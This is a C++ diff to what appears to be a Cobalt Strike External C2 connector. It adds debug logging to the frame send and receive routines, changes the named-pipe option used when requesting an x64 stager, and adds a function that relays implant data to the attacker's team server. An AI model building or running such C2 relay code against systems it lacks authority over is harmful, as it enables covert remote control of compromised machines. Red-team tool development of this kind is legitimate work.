@@ -27,12 +27,14 @@
 
 //converetd to vector 
 std::vector<uint8_t> recv_frame(SOCKET my_socket) {
+	std::cout << "[TS] Reciving frame from TS" << std::endl;
 	uint32_t size = 0;
 	uint32_t total = 0;
 
 	// read exactly 4 bytes for the frame size
 	uint8_t size_bytes[4];
 	int ret = recv(my_socket, reinterpret_cast<char*>(size_bytes), 4, 0);
+	std::cout << "[TS] Data from TS size: " << ret << std::endl;
 	if (ret != 4) {
 		throw std::runtime_error("Failed to read frame size");
 	}
@@ -44,6 +46,7 @@ std::vector<uint8_t> recv_frame(SOCKET my_socket) {
 	buffer.reserve(size);
 
 	while (total < size) {
+		std::cout << "[TS] Loop - Getting data from TS: " << std::endl;
 		uint8_t temp_buf[4096];  // read in chunks
 		int to_read = std::min<int>(size - total, sizeof(temp_buf));
 		ret = recv(my_socket, reinterpret_cast<char*>(temp_buf), to_read, 0);
@@ -60,8 +63,10 @@ std::vector<uint8_t> recv_frame(SOCKET my_socket) {
 
 /* send a frame via a socket */
 void send_frame(SOCKET my_socket, char* buffer, int length) {
-	std::cout << "[?] Sending frame to TS" << std::endl;
+	std::cout << "[TS] Sending frame to TS" << std::endl;
+	std::cout << "[TS] Sending size of frame: "<< length << std::endl;
 	send(my_socket, (char*)&length, 4, 0);
+	std::cout << "[TS] Sending data of frame." << std::endl;
 	send(my_socket, buffer, length, 0);
 }
 
@@ -81,7 +86,7 @@ std::vector<uint8_t> getx64Payload() {
 	}
 
 	send_frame(socket_extc2, (char*)"arch=x64", 8);
-	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
+	send_frame(socket_extc2, (char*)"pipename=somepipe", 17);
 	send_frame(socket_extc2, (char*)"block=100", 9);
 
 	/*
@@ -134,3 +139,44 @@ std::vector<uint8_t> getx86Payload() {
 	//printHexVector(payload);
 	return payload;
 };
+
+//dingus im using the wrong socket
+
+std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver) {
+	std::cout << "[?] Forwarding data to TeamServer" << std::endl;
+	struct sockaddr_in 	sock;
+	sock.sin_family = AF_INET;
+	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
+	sock.sin_port = htons(TeamServer::port);
+
+	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
+	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
+		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
+		exit(0);
+		//return;
+	}
+
+	//send adn rec frame as needed
+
+	send_frame(socket_extc2, reinterpret_cast<char*>(dataForTeamserver.data()), dataForTeamserver.size());
+	std::cout << "Data going to TS: " << std::endl;
+	//printHex(reinterpret_cast<char*>(it->second.fromClientBuffer.data()), it->second.fromClientBuffer.size())
+
+	std::cout << "[+] Sent to teamserver" << std::endl;
+
+	//need to get data back from TS I think
+	//char buffer[1024];
+	//auto frame = recv_frame(sock, buffer, 1024*1024);
+
+	//for (size_t i = 0; i < 1024; ++i) {
+	//    printf("%02X ", buffer[i]);
+	//}
+	//printf("\n");
+	//printHexVector(frame);
+
+	auto frame = recv_frame(socket_extc2);
+	std:: cout << "[?] Success Recv from TS" << std::endl;
+	return frame;
+
+
+}
